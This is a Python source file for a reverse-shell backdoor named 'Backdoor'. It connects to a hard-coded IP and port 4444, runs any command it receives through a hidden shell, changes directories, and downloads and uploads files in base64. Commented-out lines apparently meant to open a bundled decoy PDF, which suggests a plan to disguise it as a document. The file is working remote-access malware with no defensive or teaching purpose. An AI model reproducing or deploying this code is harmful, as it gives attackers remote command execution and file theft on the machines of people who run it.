import socket
import json
import subprocess,os,sys
import base64


class Backdoor:
    
    def __init__(self,ip,port):
        self.connections=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connections.connect((ip,port))

    def send(self,data):
        json_data=json.dumps(data.decode())
        self.connections.send(json_data.encode())
    
    def recieve(self):
        json_data=""
        while True:
            try:
                json_data = json_data+self.connections.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def ex_command(self,command):
        DEVNULL=open(os.devnull,"wb")
        return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
       
    def cd(self,path):
        os.chdir(path)
        return b"[+] Changing Directory to " + path.encode()

    def read_file(self,path):
        with open(path ,"rb") as file:
            return base64.b64encode(file.read())

    def write(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return b"[+] Upload Successful"        
        
  
    def run(self):
        while True:
            data=self.recieve()

            try:
                if data[0]=="exit":
                    self.connections.close()
                    sys.exit()
                
                elif data[0]=="cd" and len(data)>1:
                    result=self.cd(data[1])

                elif data[0]=="download":
                    result=self.read_file(data[1])

                elif data[0]=="upload":
                    result=self.write(data[1],data[2])   

                else:    
                    result=self.ex_command(data)

            except Exception:
                result=b"[+] Error"

            
            self.send(result)

        connections.close()

# file_name=sys._MEIPASS + "\the-subtle-act-of-not-giving-a-fuck.pdf"
# subprocess.Popen(file_name,shell=True)
try:
    backdoor=Backdoor("192.168.43.201",4444)
    backdoor.run()

except Exception:
    sys.exit()
